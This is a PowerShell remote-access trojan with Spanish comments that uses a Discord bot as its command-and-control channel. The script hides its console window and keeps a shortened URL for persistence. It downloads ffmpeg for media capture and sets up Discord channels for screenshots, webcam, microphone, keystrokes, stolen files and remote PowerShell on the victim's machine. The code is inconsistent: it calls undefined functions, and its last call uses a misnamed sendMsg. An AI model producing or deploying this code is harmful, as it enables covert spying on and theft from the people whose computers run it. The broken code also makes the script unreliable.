# =====================================================================================================================================================
<#
**CONFIGURACIÓN**
1. Crea un bot de Discord en https://discord.com/developers/applications/.
2. Habilita todos los Privileged Gateway Intents en la página "Bot".
3. En la página OAuth2, marca "Bot" en la sección Scopes.
4. En Bot Permissions, selecciona Manage Channels, Read Messages/View Channels, Attach Files, Read Message History.
5. Copia la URL generada, ábrela en el navegador y añade el bot a tu servidor.
6. En la página "Bot", haz clic en "Reset Token" y copia el token.

**CONFIGURACIÓN DEL SCRIPT**
1. Copia el token en la variable $global:token justo debajo.

**INFORMACIÓN**
- El bot debe estar en UN ÚNICO servidor de Discord.
-------------------------------------------------------------------------------------------------
#>
# =====================================================================================================================================================
$global:token = "TU_BOT_TOKEN" # Asegúrate de que tu bot esté en un solo servidor
# =============================================================== CONFIGURACIÓN DEL SCRIPT ==============================================================

$HideConsole = 1 # OCULTAR LA VENTANA - Cambia a 1 para ocultar la consola mientras se ejecuta
$spawnChannels = 1 # Crear un nuevo canal al iniciar la sesión
$InfoOnConnect = 1 # Generar mensaje de información al iniciar la sesión
$defaultstart = 1 # Opción para iniciar automáticamente todos los trabajos al ejecutar
$global:parent = "https://is.gd/bwdcc2" # URL del script principal (para reinicios y persistencia)

# Elimina el "stager" de reinicio (si está presente)
if (Test-Path "C:\Windows\Tasks\service.vbs") {
    $InfoOnConnect = 0
    rm -path "C:\Windows\Tasks\service.vbs" -Force
}
$version = "1.5.1" # Número de versión
$response = $null
$previouscmd = $null
$authenticated = 0
$timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"

# =============================================================== FUNCIONES DEL MÓDULO ===============================================================
# Descarga de ffmpeg.exe (dependencia para captura multimedia)
Function GetFfmpeg {
    sendMsg -Message ":hourglass: ``Descargando FFmpeg en el cliente... Espere`` :hourglass:"
    $Path = "$env:Temp\ffmpeg.exe"
    $tempDir = "$env:Temp"
    If (!(Test-Path $Path)) {
        $apiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "PowerShell")
        $response = $wc.DownloadString("$apiUrl")
        $release = $response | ConvertFrom-Json
        $asset = $release.assets | Where-Object { $_.name -like "*essentials_build.zip" }
        $zipUrl = $asset.browser_download_url
        $zipFilePath = Join-Path $tempDir $asset.name
        $extractedDir = Join-Path $tempDir ($asset.name -replace '.zip$', '')
        $wc.DownloadFile($zipUrl, $zipFilePath)
        Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
        Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
        rm -Path $zipFilePath -Force
        rm -Path $extractedDir -Recurse -Force
    }
}

# Crear una nueva categoría para canales de texto
Function NewChannelCategory {
    $headers = @{
        'Authorization' = "Bot $token"
    }
    $guildID = $null
    while (!($guildID)) {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", $headers.Authorization)
        $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
        $guilds = $response | ConvertFrom-Json
        foreach ($guild in $guilds) {
            $guildID = $guild.id
        }
        sleep 3
    }
    $uri = "https://discord.com/api/guilds/$guildID/channels"
    $body = @{
        "name" = "$env:COMPUTERNAME"
        "type" = 4
    } | ConvertTo-Json
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $token")
    $wc.Headers.Add("Content-Type", "application/json")
    $response = $wc.UploadString($uri, "POST", $body)
    $responseObj = ConvertFrom-Json $response
    Write-Host "El ID de la nueva categoría es: $($responseObj.id)"
    $global:CategoryID = $responseObj.id
}

# Crear un nuevo canal
Function NewChannel {
    param ([string]$name)
    $headers = @{
        'Authorization' = "Bot $token"
    }
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", $headers.Authorization)
    $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
    $guilds = $response | ConvertFrom-Json
    foreach ($guild in $guilds) {
        $guildID = $guild.id
    }
    $uri = "https://discord.com/api/guilds/$guildID/channels"
    $body = @{
        "name" = "$name"
        "type" = 0
        "parent_id" = $CategoryID
    } | ConvertTo-Json
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $token")
    $wc.Headers.Add("Content-Type", "application/json")
    $response = $wc.UploadString($uri, "POST", $body)
    $responseObj = ConvertFrom-Json $response
    Write-Host "El ID del nuevo canal es: $($responseObj.id)"
    $global:ChannelID = $responseObj.id
}

# Enviar un mensaje o embed al canal de Discord
function sendMsg {
    param ([string]$Message, [string]$Embed)

    $url = "https://discord.com/api/v10/channels/$SessionID/messages"
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $token")

    if ($Embed) {
        $jsonBody = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
        $wc.Headers.Add("Content-Type", "application/json")
        $response = $wc.UploadString($url, "POST", $jsonBody)
        $jsonPayload = $null
    }
    if ($Message) {
        $jsonBody = @{
            "content" = "$Message"
            "username" = "$env:computername"
        } | ConvertTo-Json
        $wc.Headers.Add("Content-Type", "application/json")
        $response = $wc.UploadString($url, "POST", $jsonBody)
        $message = $null
    }
}

# Ocultar la ventana de PowerShell
function HideWindow {
    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
    $hwnd = (Get-Process -PID $pid).MainWindowHandle
    if ($hwnd -ne [System.IntPtr]::Zero) {
        $Type::ShowWindowAsync($hwnd, 0)
    } else {
        $Host.UI.RawUI.WindowTitle = 'ocultar'
        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'ocultar' })
        $hwnd = $Proc.MainWindowHandle
        $Type::ShowWindowAsync($hwnd, 0)
    }
}

# --------------------------------------------------------------- INICIO DEL SCRIPT -------------------------------------------------------------------
# Ocultar la consola
If ($hideconsole -eq 1) {
    HideWindow
}

# Crear categorías y canales
NewChannelCategory
sleep 1
NewChannel -name 'control-de-sesion'
$global:SessionID = $ChannelID
sleep 1
NewChannel -name 'capturas-de-pantalla'
$global:ScreenshotID = $ChannelID
sleep 1
NewChannel -name 'webcam'
$global:WebcamID = $ChannelID
sleep 1
NewChannel -name 'microfono'
$global:MicrophoneID = $ChannelID
sleep 1
NewChannel -name 'captura-teclas'
$global:keyID = $ChannelID
sleep 1
NewChannel -name 'archivos'
$global:LootID = $ChannelID
sleep 1
NewChannel -name 'powershell'
$global:PowershellID = $ChannelID
sleep 1

# Descargar ffmpeg al directorio temporal
$Path = "$env:Temp\ffmpeg.exe"
If (!(Test-Path $Path)) {
    GetFfmpeg
}

# Mensaje de inicio
ConnectMsg

# Iniciar todas las funciones
If ($defaultstart -eq 1) {
    StartAll
}

# Enviar mensaje de configuración completa
enviarMsg -Mensaje ":white_check_mark: ``$env:COMPUTERNAME Configuración completa!`` :white_check_mark:"
